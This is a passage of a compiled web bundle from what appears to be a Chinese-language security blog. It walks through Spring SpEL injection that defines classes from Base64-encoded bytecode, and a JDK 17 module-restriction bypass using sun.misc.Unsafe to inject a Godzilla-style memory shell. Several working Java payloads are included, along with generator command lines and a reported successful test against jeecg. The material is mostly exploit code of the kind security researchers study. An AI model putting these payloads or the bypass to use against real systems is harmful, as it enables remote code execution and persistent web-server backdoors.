SPEL \u6ce8\u5165\u3002"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{children:"{T(org.springframework.cglib.core.ReflectUtils).defineClass('org.springframework.expression.Test',T(java.util.Base64).getDecoder().decode('yv66vgAAADQALwoACgAXCQAYABkIABoKABsAHAoAHQAeCAAfCgAdACAHACEHACIHACMBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUxvcmcvc3ByaW5nZnJhbWV3b3JrL2V4cHJlc3Npb24vVGVzdDsBAAg8Y2xpbml0PgEADVN0YWNrTWFwVGFibGUHACEBAApTb3VyY2VGaWxlAQAJVGVzdC5qYXZhDAALAAwHACQMACUAJgEAC3N0YXRpYyBFeGVjBwAnDAAoACkHACoMACsALAEAFm9wZW4gLWEgQ2FsY3VsYXRvci5hcHAMAC0ALgEAE2phdmEvbGFuZy9FeGNlcHRpb24BACNvcmcvc3ByaW5nZnJhbWV3b3JrL2V4cHJlc3Npb24vVGVzdAEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEACQAKAAAAAAACAAEACwAMAAEADQAAAC8AAQABAAAABSq3AAGxAAAAAgAOAAAABgABAAAABgAPAAAADAABAAAABQAQABEAAAAIABIADAABAA0AAABbAAIAAQAAABayAAISA7YABLgABRIGtgAHV6cABEuxAAEAAAARABQACAADAA4AAAAWAAUAAAAJAAgACgARAAwAFAALABUADQAPAAAAAgAAABMAAAAHAAJUBwAUAAABABUAAAACABY='),T(java.lang.Thread).currentThread().getContextClassLoader(), null, T(java.lang.Class).forName(\"org.springframework.expression.ExpressionParser\"))}\n"})}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"image-20240502131129801",src:a(63779).Z+"",width:"2058",height:"1218"})}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{children:"-e JavaClass -jht RceEcho -mw Spring -je SPEL,FreeMarker -jme JDK17\n"})}),"\n",(0,s.jsx)(e.p,{children:"jeecg \u6d4b\u8bd5\u6210\u529f"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"image-20240503231422123",src:a(15076).Z+"",width:"1758",height:"772"})}),"\n",(0,s.jsxs)(e.p,{children:["\u56e0\u4e3a ",(0,s.jsx)(e.code,{children:"ReflectUtils"})," \u662f\u7528 ",(0,s.jsx)(e.code,{children:"Class.forName()"})," \u89e6\u53d1\u7684\uff0c\u6211\u4eec\u53c8\u76f4\u63a5\u6ce8\u5165\u5230 ",(0,s.jsx)(e.code,{children:"Thread.currentThread().getContextClassLoader()"})," \u4e2d\uff0c\u6240\u4ee5\u7528 ",(0,s.jsx)(e.code,{children:"loadClass()"})," \u518d\u6b21\u52a0\u8f7d"]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"image-20240503230939695",src:a(71937).Z+"",width:"1684",height:"714"})}),"\n",(0,s.jsx)(e.h3,{id:"\u8865\u5145",children:"\u8865\u5145"}),"\n",(0,s.jsxs)(e.p,{children:["\u5728\u6253\u8fc7\u4e00\u6b21\u540e\u518d\u6b21\u8c03\u8bd5 ",(0,s.jsx)(e.code,{children:"ReflectUtils#defineClass()"})," \u65b9\u6cd5\u4f1a\u53d1\u73b0 loader \u59d4\u6d3e\u7ed9\u4e86\u5bb9\u5668\u8fd0\u884c\u7684 ",(0,s.jsx)(e.code,{children:"org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedWebappClassLoader"})," \u5bfc\u81f4 ",(0,s.jsx)(e.code,{children:"contextClass.getClassLoader() == loader"})," \u4e3a flase \u8fdb\u4e0d\u53bb\u7b2c\u4e00\u4e2a\u903b\u8f91"]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"image-20240513221429732",src:a(59490).Z+"",width:"1876",height:"930"})}),"\n",(0,s.jsxs)(e.p,{children:["\u4e0d\u8fc7\u4e0b\u6587\u9488\u5bf9\u8fd9\u79cd\u60c5\u51b5\u4ecd\u7136\u5141\u8bb8 ",(0,s.jsx)(e.code,{children:"MethodHandles.Lookup"})," \u8c03\u7528\uff0c\u6240\u4ee5\u5b9e\u9645\u8981\u6ee1\u8db3\u7684\u6761\u4ef6\u662f ",(0,s.jsx)(e.code,{children:"contextClass != null && contextClass.getClassLoader() != loader"})]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"image-20240513221747041",src:a(84981).Z+"",width:"1978",height:"616"})}),"\n",(0,s.jsx)(e.h2,{id:"0x03-unsafe-\u7ed5\u8fc7-jdk-17-\u53cd\u5c04\u9650\u5236-named-module",children:"0x03 Unsafe \u7ed5\u8fc7 JDK 17 \u53cd\u5c04\u9650\u5236 (named module)"}),"\n",(0,s.jsxs)(e.p,{children:["\u5230\u8fd9\u91cc\u6211\u4eec\u5df2\u7ecf\u53ef\u4ee5\u901a\u8fc7 SPEL \u52a0\u8f7d\u5b57\u8282\u7801\uff0c\u4f46\u8fd8\u5dee\u4e00\u70b9\uff0c\u6211\u4eec\u4ecd\u7136\u88ab named module \u7ed9\u9650\u5236\u4f4f\uff0c\u6ca1\u529e\u6cd5\u6253\u5185\u5b58\u9a6c\u3002\u5728\u4e4b\u524d\u7684\u7248\u672c\u4e2d\u9ed8\u8ba4\u544a\u8b66\uff0cJDK 17 \u4e4b\u540e",(0,s.jsx)(e.a,{href:"https://docs.oracle.com/en/java/javase/17/migrate/migrating-jdk-8-later-jdk-releases.html#GUID-7BB28E4D-99B3-4078-BDC4-FC24180CE82B",children:"\u5f3a\u5236\u5f00\u542f"})]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-java",children:'Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);\ndefineClass.setAccessible(true);\nbyte[] bytecode = Base64.getDecoder().decode("yv66vgAAADQALwoACgAXCQAYABkIABoKABsAHAoAHQAeCAAfCgAdACAHACEHACIHACMBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUxvcmcvc3ByaW5nZnJhbWV3b3JrL2V4cHJlc3Npb24vVGVzdDsBAAg8Y2xpbml0PgEADVN0YWNrTWFwVGFibGUHACEBAApTb3VyY2VGaWxlAQAJVGVzdC5qYXZhDAALAAwHACQMACUAJgEAC3N0YXRpYyBFeGVjBwAnDAAoACkHACoMACsALAEAFm9wZW4gLWEgQ2FsY3VsYXRvci5hcHAMAC0ALgEAE2phdmEvbGFuZy9FeGNlcHRpb24BACNvcmcvc3ByaW5nZnJhbWV3b3JrL2V4cHJlc3Npb24vVGVzdAEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEACQAKAAAAAAACAAEACwAMAAEADQAAAC8AAQABAAAABSq3AAGxAAAAAgAOAAAABgABAAAABgAPAAAADAABAAAABQAQABEAAAAIABIADAABAA0AAABbAAIAAQAAABayAAISA7YABLgABRIGtgAHV6cABEuxAAEAAAARABQACAADAA4AAAAWAAUAAAAJAAgACgARAAwAFAALABUADQAPAAAAAgAAABMAAAAHAAJUBwAUAAABABUAAAACABY=");\nClass clazz = (Class) defineClass.invoke(Thread.currentThread().getContextClassLoader(), bytecode, 0, bytecode.length);\nclazz.newInstance();\n'})}),"\n",(0,s.jsxs)(e.p,{children:["\u6211\u4eec\u5728\u6267\u884c ",(0,s.jsx)(e.code,{children:"defineClass.setAccessible(true);"})," \u65f6\u4ecd\u7136\u4f1a\u88ab\u9650\u5236"]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"image-20240503144046772",src:a(59854).Z+"",width:"1866",height:"884"})}),"\n",(0,s.jsxs)(e.p,{children:["\u987a\u7740\u524d\u9762\u7684\u601d\u8def\u53ef\u4ee5\u7528 ",(0,s.jsx)(e.code,{children:"MethodHandles.Lookup"})," \u6765\u52a0\u8f7d\uff0c\u4e0d\u8fc7\u6709\u4e2a\u5305\u540d\u4e00\u81f4\u7684\u95ee\u9898\uff0c\u5176\u5b9e\u4e5f\u6709\u4e00\u4e2a ",(0,s.jsx)(e.code,{children:"newInstanceNoCheck()"})," \u7684\u5229\u7528"]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-java",children:'        Method privateLookupInMethod = MethodHandles.class.getMethod("privateLookupIn", Class.class, MethodHandles.Lookup.class);\n        Method lookupDefineClassMethod = MethodHandles.Lookup.class.getMethod("defineClass", byte[].class);\n        byte[] bytecode = Base64.getDecoder().decode("yv66vgAAADQALwoACgAXCQAYABkIABoKABsAHAoAHQAeCAAfCgAdACAHACEHACIHACMBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUxvcmcvc3ByaW5nZnJhbWV3b3JrL2V4cHJlc3Npb24vVGVzdDsBAAg8Y2xpbml0PgEADVN0YWNrTWFwVGFibGUHACEBAApTb3VyY2VGaWxlAQAJVGVzdC5qYXZhDAALAAwHACQMACUAJgEAC3N0YXRpYyBFeGVjBwAnDAAoACkHACoMACsALAEAFm9wZW4gLWEgQ2FsY3VsYXRvci5hcHAMAC0ALgEAE2phdmEvbGFuZy9FeGNlcHRpb24BACNvcmcvc3ByaW5nZnJhbWV3b3JrL2V4cHJlc3Npb24vVGVzdAEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEACQAKAAAAAAACAAEACwAMAAEADQAAAC8AAQABAAAABSq3AAGxAAAAAgAOAAAABgABAAAABgAPAAAADAABAAAABQAQABEAAAAIABIADAABAA0AAABbAAIAAQAAABayAAISA7YABLgABRIGtgAHV6cABEuxAAEAAAARABQACAADAA4AAAAWAAUAAAAJAAgACgARAAwAFAALABUADQAPAAAAAgAAABMAAAAHAAJUBwAUAAABABUAAAACABY=");\n        MethodHandles.Lookup lookup = (MethodHandles.Lookup) privateLookupInMethod.invoke(null, Class.forName("org.springframework.expression.ExpressionParser"), MethodHandles.lookup());\n        Class<?> c = (Class<?>) lookupDefineClassMethod.invoke(lookup, bytecode);\n        c.getDeclaredConstructor().newInstance();\n'})}),"\n",(0,s.jsxs)(e.p,{children:["\u8fd9\u91cc\u4ecb\u7ecd\u53e6\u4e00\u79cd\u66f4\u52a0\u7b80\u5355\u7684\u7528\u6cd5\uff0c\u5229\u7528 Unsafe\uff0c\u5728 ",(0,s.jsx)(e.a,{href:"https://github.com/BeichenDream/GodzillaMemoryShellProject/blob/main/TomcatMemoryShell/src/AesBase64TomcatListenerShell.java",children:"GodzillaMemoryShellProject"})," \u8fd9\u4e2a\u9879\u76ee\u4e2d\u4e5f\u7528\u5230\u4e86 Unsafe \u6765\u64cd\u4f5c\u5b57\u6bb5\uff0c\u987a\u7740\u8fd9\u6b21\u7814\u7a76\u4e5f\u6709\u4e86\u65b0\u7684\u601d\u8def\u3002\u8ddf\u8fdb ",(0,s.jsx)(e.code,{children:"java.lang.reflect.Method#setAccessible()"})," \u65b9\u6cd5\uff0c\u6700\u7ec8\u5b9a\u4f4d\u5230 ",(0,s.jsx)(e.code,{children:"java.lang.reflect.AccessibleObject#checkCanSetAccessible()"})," \u5224\u65ad\u4e86 ",(0,s.jsx)(e.code,{children:"Module"})," \u662f\u5426\u4e00\u81f4\u3002"]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"image-20240503145715622",src:a(77450).Z+"",width:"1736",height:"786"})}),"\n",(0,s.jsxs)(e.p,{children:["\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u5229\u7528 ",(0,s.jsx)(e.code,{children:"sun.misc.Unsafe#getAndSetObject()"})," \u4fee\u6539\u5f53\u524d\u7c7b\u7684 Module \u4e0e ",(0,s.jsx)(e.code,{children:"java.*"})," \u4e00\u6837\u6765\u7ed5\u8fc7\u3002"]}),"\n",(0,s.jsxs)(e.p,{children:[(0,s.jsx)(e.code,{children:"getAndSetObject()"})," \u539f\u5b50\u5730\u4ea4\u6362\u4e86\u6307\u5b9a\u504f\u79fb\u91cf ",(0,s.jsx)(e.code,{children:"offset"})," \u5904\u5b57\u6bb5\u7684\u5f53\u524d\u503c\u4e0e\u65b0\u503c\uff0c\u7136\u540e\u8fd4\u56de\u4e4b\u524d\u7684\u503c\u3002\u8fd9\u610f\u5473\u7740\u5b83\u9996\u5148\u83b7\u53d6\u5b57\u6bb5\u7684\u5f53\u524d\u503c\uff0c\u7136\u540e\u5c06\u65b0\u503c\u8bbe\u7f6e\u5230\u5b57\u6bb5\u4e2d\uff0c\u5e76\u8fd4\u56de\u4e4b\u524d\u7684\u503c\u3002\u56e0\u6b64\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u4e0d\u4ec5\u8bbe\u7f6e\u4e86\u65b0\u503c\uff0c\u8fd8\u8fd4\u56de\u4e86\u4e4b\u524d\u7684\u503c\u3002\u4e0e\u4e4b\u76f8\u5bf9\u7684",(0,s.jsx)(e.code,{children:"putObject()"})," \u5c31\u6ca1\u8fd4\u56de\u503c"]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"image-20240504195544544",src:a(88564).Z+"",width:"1466",height:"470"})}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"image-20240504195458022",src:a(24908).Z+"",width:"737",height:"209"})}),"\n",(0,s.jsx)(e.p,{children:"Demo \u5982\u4e0b"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-java",children:'Class unsafeClass = Class.forName("sun.misc.Unsafe");\nField unsafeField = unsafeClass.getDeclaredField("theUnsafe");\nunsafeField.setAccessible(true);\nUnsafe unsafe = (Unsafe) unsafeField.get(null);\n\nModule module = Object.class.getModule();\nClass cls = UnsafeDemo.class;\nlong offset = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));\n\nunsafe.getAndSetObject(cls, offset, module);\n\nMethod defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);\ndefineClass.setAccessible(true);\nbyte[] bytecode = Base64.getDecoder().decode("yv66vgAAADQALwoACgAXCQAYABkIABoKABsAHAoAHQAeCAAfCgAdACAHACEHACIHACMBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUxvcmcvc3ByaW5nZnJhbWV3b3JrL2V4cHJlc3Npb24vVGVzdDsBAAg8Y2xpbml0PgEADVN0YWNrTWFwVGFibGUHACEBAApTb3VyY2VGaWxlAQAJVGVzdC5qYXZhDAALAAwHACQMACUAJgEAC3N0YXRpYyBFeGVjBwAnDAAoACkHACoMACsALAEAFm9wZW4gLWEgQ2FsY3VsYXRvci5hcHAMAC0ALgEAE2phdmEvbGFuZy9FeGNlcHRpb24BACNvcmcvc3ByaW5nZnJhbWV3b3JrL2V4cHJlc3Npb24vVGVzdAEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEACQAKAAAAAAACAAEACwAMAAEADQAAAC8AAQABAAAABSq3AAGxAAAAAgAOAAAABgABAAAABgAPAAAADAABAAAABQAQABEAAAAIABIADAABAA0AAABbAAIAAQAAABayAAISA7YABLgABRIGtgAHV6cABEuxAAEAAAARABQACAADAA4AAAAWAAUAAAAJAAgACgARAAwAFAALABUADQAPAAAAAgAAABMAAAAHAAJUBwAUAAABABUAAAACABY=");\nClass clazz = (Class) defineClass.invoke(Thread.currentThread().getContextClassLoader(), bytecode, 0, bytecode.length);\nclazz.newInstance();\n'})}),"\n",(0,s.jsx)(e.p,{children:"pwn"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{children:"-e JavaClass -jht MemShell -mw Spring -ms Interceptor -msf Godzilla -je SPEL,FreeMarker -jme JDK17 -mt raw\n"})}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"image-20240503165400440",src:a(201).Z+"",width:"964",height:"942"})})]})}function i(A={}){const{wrapper:e}={...(0,n.a)(),...A.components};return e?(0,s.jsx)(e,{...A,children:(0,s.jsx)(r,{...A})}):r(A)}},56818:(A,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image-20240502021123023-d2fdd7a3419919b05f2ffa13f826754c.png"},423:(A,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image-20240502111353936-2aa21779da70819a41bf84f81291456c.png"},36915:(A,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image-20240502111908506-74d459b0292af6e4b3216e841360b42f.png"},20122:(A,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image-20240502123601472-e489b9fe921f8638d8a02b2554c6b994.png"},2242:(A,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image-20240502123726386-065c503dd4ef0c5968fe49e377a23d0d.png"},38310:(A,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image-20240502124116265-aa205a0a422a5ec7bfe29558ced4e441.png"},15422:(A,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image-20240502130200048-3de38eff5cce21bbd8b78fd9d933a8b7.png"},4962:(A,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image-20240502130823359-d6f44f7be3e65543d0d21a47c894822f.png"},63779:(A,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image-20240502131129801-532ec56d347133ebca462f51bf17b1ad.png"},59854:(A,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image-20240503144046772-2f8d8ea29d400fbd37d2440a3d4880da.png"},77450:(A,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image-20240503145715622-b73b7a6b39f9a3d78b3c9d4988f765d4.png"},201:(A,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image-20240503165400440-8e4942a2779b731c7d467265befb80b7.png"},71937:(A,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image-20240503230939695-be901dcbb179adfe98ad1195a24e4a26.png"},48269:(A,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image-20240503231032097-ce5f55805c25e61c724f8453f51e2316.png"},15076:(A,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image-20240503231422123-51bf74d271c6801d8a5ff9591746c678.png"},56825:(A,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image-20240503231958181-a4b7ba9df6ceddc2740588b7a901db4c.png"},63814:(A,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image-20240503232216065-001733bffa418210f9849d20573b655c.png"},24370:(A,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image-20240503232306448-bdac1d0d9910f733fecb3749b7d79824.png"},24908:(A,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image-20240504195458022-fdf89682145e7928279a4decdc40aaa9.png"},88564:(A,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image-20240504195544544-14147c254c69f6091bf0b5f4ae1b0af7.png"},59490:(A,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image-20240513221429732-cb8335b9ae7f0aea2046e059d8109c2b.png"},84981:(A,e,a)=>{a.d(e,{Z:()=>s});const s=a.p+"assets/images/image-20240513221747041-ce3b9a97cb04f82d1d7aed1c2d90134e.png"},11151:(A,e,a)=>{a.d(e,{Z:()=>c,a:()=>d});var s=a(67294);const n={},l=s.createContext(n);function d(A){const e=s.useContext(l);return s.useMemo((function(){return"function"==typeof A?A(e):{...e,...A}}),[e,A])}function c(A){let e;return e=A.disableParentContext?"function"==typeof A.components?A.components(n):A.components||n:d(A.components),s.createElement(l.Provider,{value:e},A.children)}}}]);